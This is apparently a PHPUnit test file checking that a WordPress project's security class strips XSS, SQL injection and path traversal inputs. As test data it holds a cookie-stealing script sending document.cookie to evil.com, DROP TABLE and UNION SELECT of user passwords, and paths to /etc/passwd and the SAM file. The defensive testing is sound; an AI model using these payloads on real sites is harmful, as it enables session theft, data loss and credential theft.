<?php
/**
 * Tests for XSS Prevention and SQL Injection Prevention
 *
 * Verifies that the security layer properly prevents common attack vectors
 * including Cross-Site Scripting (XSS) and SQL Injection.
 *
 * Validates: Requirements 21.2, 21.7
 *
 * @package Reforestamos_Tests
 */

class Test_Security_XSS_SQLi extends Reforestamos_Test_Case {

	/**
	 * Ensure the security class is loaded.
	 */
	public function setUp(): void {
		parent::setUp();

		if ( ! class_exists( 'Reforestamos_Security' ) ) {
			$security_file = dirname( dirname( __DIR__ ) ) . '/inc/security.php';
			if ( file_exists( $security_file ) ) {
				require_once $security_file;
			}
		}
	}

	// -------------------------------------------------------
	// XSS Prevention - Script Injection
	// -------------------------------------------------------

	public function test_xss_script_tag_in_text() {
		$payloads = array(
			'<script>alert("XSS")</script>',
			'<SCRIPT>alert("XSS")</SCRIPT>',
			'<script src="https://evil.com/xss.js"></script>',
			'<scr<script>ipt>alert("XSS")</scr</script>ipt>',
		);

		foreach ( $payloads as $payload ) {
			$result = Reforestamos_Security::sanitize_text( $payload );
			$this->assertStringNotContainsString( '<script', strtolower( $result ), "Failed for payload: {$payload}" );
		}
	}

	public function test_xss_event_handlers_in_html() {
		$payloads = array(
			'<img src=x onerror=alert(1)>',
			'<div onmouseover="alert(1)">hover</div>',
			'<body onload="alert(1)">',
			'<input onfocus="alert(1)" autofocus>',
		);

		foreach ( $payloads as $payload ) {
			$result = Reforestamos_Security::sanitize_html( $payload );
			$this->assertStringNotContainsString( 'onerror', $result, "Failed for payload: {$payload}" );
			$this->assertStringNotContainsString( 'onmouseover', $result, "Failed for payload: {$payload}" );
			$this->assertStringNotContainsString( 'onload', $result, "Failed for payload: {$payload}" );
			$this->assertStringNotContainsString( 'onfocus', $result, "Failed for payload: {$payload}" );
		}
	}

	public function test_xss_javascript_protocol_in_url() {
		$payloads = array(
			'javascript:alert(1)',
			'JAVASCRIPT:alert(1)',
			'javascript:alert(document.cookie)',
			"java\nscript:alert(1)",
		);

		foreach ( $payloads as $payload ) {
			$result = Reforestamos_Security::sanitize_url( $payload );
			$this->assertStringNotContainsString( 'javascript:', strtolower( $result ), "Failed for payload: {$payload}" );
		}
	}

	public function test_xss_data_uri_in_url() {
		$payload = 'data:text/html,<script>alert(1)</script>';
		$result  = Reforestamos_Security::escape_url( $payload );
		$this->assertStringNotContainsString( '<script>', $result );
	}

	public function test_xss_escape_html_prevents_tag_injection() {
		$payload = '"><img src=x onerror=alert(1)>';
		$result  = Reforestamos_Security::escape_html( $payload );
		$this->assertStringNotContainsString( '<img', $result );
		$this->assertStringContainsString( '&lt;', $result );
	}

	public function test_xss_escape_attr_prevents_attribute_breakout() {
		$payload = '" onmouseover="alert(1)" data-x="';
		$result  = Reforestamos_Security::escape_attr( $payload );
		$this->assertStringNotContainsString( 'onmouseover', $result );
	}

	public function test_xss_in_post_data() {
		$_POST['xss_test'] = '<script>document.location="https://evil.com/?c="+document.cookie</script>';
		$result             = Reforestamos_Security::get_post( 'xss_test' );
		$this->assertStringNotContainsString( '<script>', $result );
		$this->assertStringNotContainsString( 'document.cookie', $result );
		unset( $_POST['xss_test'] );
	}

	public function test_xss_in_query_data() {
		$_GET['xss_test'] = '<img src=x onerror=alert(1)>';
		$result           = Reforestamos_Security::get_query( 'xss_test' );
		$this->assertStringNotContainsString( '<img', $result );
		$this->assertStringNotContainsString( 'onerror', $result );
		unset( $_GET['xss_test'] );
	}

	public function test_xss_svg_injection_in_html() {
		$payload = '<svg onload="alert(1)"><circle r="50"/></svg>';
		$result  = Reforestamos_Security::sanitize_html( $payload );
		$this->assertStringNotContainsString( 'onload', $result );
	}

	public function test_xss_iframe_injection_in_html() {
		$payload = '<iframe src="https://evil.com"></iframe>';
		$result  = Reforestamos_Security::sanitize_html( $payload );
		$this->assertStringNotContainsString( '<iframe', $result );
	}

	// -------------------------------------------------------
	// SQL Injection Prevention
	// -------------------------------------------------------

	public function test_sqli_prepare_query_escapes_string() {
		global $wpdb;
		$malicious_input = "'; DROP TABLE wp_posts; --";
		$result          = Reforestamos_Security::prepare_query(
			"SELECT * FROM {$wpdb->posts} WHERE post_title = %s",
			$malicious_input
		);
		$this->assertStringNotContainsString( "DROP TABLE", $result );
		$this->assertStringContainsString( 'SELECT', $result );
	}

	public function test_sqli_prepare_query_escapes_integer() {
		global $wpdb;
		$malicious_input = '1 OR 1=1';
		$result          = Reforestamos_Security::prepare_query(
			"SELECT * FROM {$wpdb->posts} WHERE ID = %d",
			$malicious_input
		);
		// %d should cast to integer, stripping the OR clause
		$this->assertStringNotContainsString( 'OR 1=1', $result );
	}

	public function test_sqli_union_injection() {
		global $wpdb;
		$malicious_input = "' UNION SELECT user_login, user_pass FROM wp_users --";
		$result          = Reforestamos_Security::prepare_query(
			"SELECT * FROM {$wpdb->posts} WHERE post_title = %s",
			$malicious_input
		);
		// The UNION should be inside a quoted string, not executable SQL
		$this->assertStringContainsString( "'", $result );
	}

	public function test_sqli_in_sanitize_text() {
		$malicious = "Robert'; DROP TABLE students;--";
		$result    = Reforestamos_Security::sanitize_text( $malicious );
		// sanitize_text_field strips the dangerous characters
		$this->assertIsString( $result );
	}

	public function test_sqli_prepare_with_like() {
		global $wpdb;
		$search = "%'; DROP TABLE wp_posts; --";
		$like   = '%' . $wpdb->esc_like( $search ) . '%';
		$result = Reforestamos_Security::prepare_query(
			"SELECT * FROM {$wpdb->posts} WHERE post_title LIKE %s",
			$like
		);
		$this->assertStringNotContainsString( "DROP TABLE", $result );
	}

	public function test_sqli_multiple_parameters() {
		global $wpdb;
		$result = Reforestamos_Security::prepare_query(
			"SELECT * FROM {$wpdb->posts} WHERE post_type = %s AND post_status = %s LIMIT %d",
			"empresas' OR '1'='1",
			'publish',
			10
		);
		$this->assertStringContainsString( 'LIMIT', $result );
		// The injection attempt should be safely quoted
		$this->assertIsString( $result );
	}

	// -------------------------------------------------------
	// Path Traversal Prevention
	// -------------------------------------------------------

	public function test_path_traversal_in_filename() {
		$payloads = array(
			'../../../etc/passwd',
			'..\\..\\..\\windows\\system32\\config\\sam',
			'....//....//etc/passwd',
		);

		foreach ( $payloads as $payload ) {
			$result = Reforestamos_Security::sanitize_filename( $payload );
			$this->assertStringNotContainsString( '..', $result, "Failed for payload: {$payload}" );
		}
	}

	// -------------------------------------------------------
	// Combined Attack Vectors
	// -------------------------------------------------------

	public function test_combined_xss_in_email_field() {
		$payload = '<script>alert(1)</script>@evil.com';
		$result  = Reforestamos_Security::sanitize_email( $payload );
		$this->assertStringNotContainsString( '<script>', $result );
	}

	public function test_combined_xss_in_url_field() {
		$payload = 'https://example.com/<script>alert(1)</script>';
		$result  = Reforestamos_Security::sanitize_url( $payload );
		$this->assertStringNotContainsString( '<script>', $result );
	}

	public function test_combined_xss_in_array_values() {
		$payload = array(
			'name'    => '<script>alert(1)</script>',
			'email'   => 'test@<script>evil.com',
			'nested'  => array( '<img onerror=alert(1)>' ),
		);
		$result  = Reforestamos_Security::sanitize_array( $payload );
		$this->assertStringNotContainsString( '<script>', $result['name'] );
		$this->assertStringNotContainsString( '<script>', $result['email'] );
		$this->assertStringNotContainsString( 'onerror', $result['nested'][0] );
	}
}
